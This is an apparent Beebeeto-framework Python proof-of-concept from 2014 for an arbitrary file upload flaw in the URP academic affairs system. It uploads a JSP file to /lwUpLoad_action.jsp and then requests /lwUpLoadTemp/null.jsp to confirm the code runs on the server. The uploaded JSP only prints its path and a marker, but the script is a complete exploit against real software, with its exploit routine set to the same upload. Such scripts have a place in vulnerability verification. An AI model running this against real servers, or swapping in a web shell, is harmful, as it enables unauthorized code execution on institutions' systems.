#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0138',
            'name': 'URP综合教务系统 /lwUpLoad_action.jsp 任意文件上传漏洞 POC',
            'author': '麋鹿迷路的迷',
            'create_date': '2014-11-07',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'URP综合教务系统',
            'vul_version': ['*'],
            'type': 'File Upload',
            'tag': ['URP漏洞', '/lwUpLoad_action.jsp', 'File Upload', 'jsp'],
            'desc': '''
                    http://xxx.xxx.xxx.xxx/lwUpLoad_action.jsp
                    post:
                      type="file" name="theFile" id="File"
                      type="text" name="xh" id="context"

                    可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-075251',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/lwUpLoadTemp/null.jsp" #没有给定xh就会生成null.jsp
        target_url = args['options']['target'] + "/lwUpLoad_action.jsp"
        file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
        <%@ page import="java.io.*"%>
        <%
        String path=application.getRealPath(request.getRequestURI());
        File d=new File(path);
        out.println(path);
        %>
        <% out.println("payload=true");%>
        '''
        files = {'theFile': ('v.jsp', file_v_jsp, 'text/plain')}

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        response = requests.post(target_url, files=files) # 上传

        response = requests.get(verify_url) # 验证
        content = response.content
        if 'payload=true' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())